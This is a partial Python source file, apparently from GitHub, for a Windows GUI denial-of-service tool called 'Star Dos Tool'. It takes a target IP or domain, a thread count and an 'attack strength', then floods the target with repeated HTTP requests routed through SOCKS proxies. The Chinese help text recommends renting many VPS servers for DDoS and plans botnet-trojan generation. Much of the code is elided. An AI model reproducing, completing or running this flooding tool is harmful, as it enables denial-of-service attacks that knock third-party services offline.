...
def starturl(ip_url,threader,m_att):  # 设置http请求
	global url
	global url2
	global urlport
	global choice1
	...
	try:
		...
		win32api.MessageBox(0, "url或者ip无法识别", "错误", win32con.MB_ICONWARNING)
...
def multiplication():
	...
	try:
		...
		win32api.MessageBox(0, "攻击值无法识别", "错误", win32con.MB_ICONWARNING)
		exit()
	begin()
	...
	def run(self):
		...
		while True:
			try:
				...
				print("收到来自 " + str(proxy[0] + ":" + proxy[1]) + " 的回复，延迟：",
					  self.counter)
				try:
	...
	def run(self):
		...
		while True:
			try:
				...
				s.send(str.encode(request))
				print("收到来自 " + str(proxy[0] + ":" + proxy[1]) + " 的回复", self.counter)
				try:
					for y in range(multiple):
						s.send(str.encode(request))
				except:
				...
				s.close()
				try:
					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]),
										  True)
					s = socks.socksocket()
					s.connect((str(url2), int(urlport)))
					s.send(str.encode(request))
					print("收到来自 " + str(proxy[0] + ":" + proxy[1]) + " 的回复",
						  self.counter)
					try:
						for y in range(multiple):
							s.send(str.encode(request))
...
class Mywin(wx.Frame):
	def __init__(self, parent, title):
		def on_clicked(event):
			ip_url = ip_txt.GetValue()
			threader = thread_txt.GetValue()
			m_att = m_att_txt.GetValue()
			print(ip_url+m_att+threader)
			try:
				starturl(ip_url,int(threader),int(m_att))
			except:
				win32api.MessageBox(0, "检查url或者ip是否填写正确\n检查线程和攻击量是否为数字\n检查文件是否完整", "错误", win32con.MB_ICONWARNING)
		def help_txt(event):
			win32api.MessageBox(0, """软件对于性能上优化暂时有所欠缺，无法发挥计算机的全部性能，有一部分原因是由于python的语言机制导致的。即使才用了多线程优化，开发者在实际体验中依然只能达到10mbps的速度。\n如果实际速度不尽人意，请试着降低或者调高线程数量。\n这软件本来就是我写着玩的，ddos还是建议购买大量的vps服务器进行攻击，同时代码仅供参考\n后期当然不会满足这么简单的需求，会改进程序并优化，考虑增加生成肉鸡木马病毒，vps客户端与服务端连接，支持搭建ddos网等等功能。\n做这个的最初目的是实践一下wxpython的使用，顺便给github凑个数，大佬勿喷，没有放任何的病毒和勒索程序在里面，请安心使用。\n                                       ——wrrite by Rainbowb121
			""", "提醒")
		super(Mywin, self).__init__(parent, title = title,size = (700,400))
		panel = wx.Panel(self)
		one_txt = wx.StaticText(panel,-1,"在此输入你要攻击的ip或者域名:")
		one_txt.SetPosition((100,50))
		ip_txt = wx.TextCtrl(panel,-1,"例如：211.163.67.41；www.baidu.com",(100,80),size = (400,30))
		two_txt = wx.StaticText(panel,-1,"在此输入线程数（推荐300~800），必填：",pos = (100,110))
		thread_txt = wx.TextCtrl(panel,-1,"800",(100,140),size = (400,30))
		three_txt = wx.StaticText(panel,-1,"输入攻击量[（1-5=正常）（50=强大）（100或更多=炸弹]：",pos = (100,170))
		m_att_txt = wx.TextCtrl(panel,-1,"50",(100,200),size = (400,30))
		start_bt = wx.Button(panel,-1,"开始攻击",pos = (200,240))
		help_bt = wx.Button(panel,-1,"帮助与指南",pos = (330,240))
		self.Bind(wx.EVT_BUTTON,on_clicked,start_bt)
		self.Bind(wx.EVT_BUTTON,help_txt,help_bt)
		self.Centre()
		self.Show()
		self.Fit()
...
#ip_bt = wx.TextCtrl(window,wx.ID_ANY,)


win32api.MessageBox(0, "欢迎使用ddos工具，任何问题后果自负", "提醒", win32con.MB_ICONWARNING)
app = wx.App(False)
Mywin(None,  '快速Dos攻击 Star Dos Tool')
app.MainLoop()
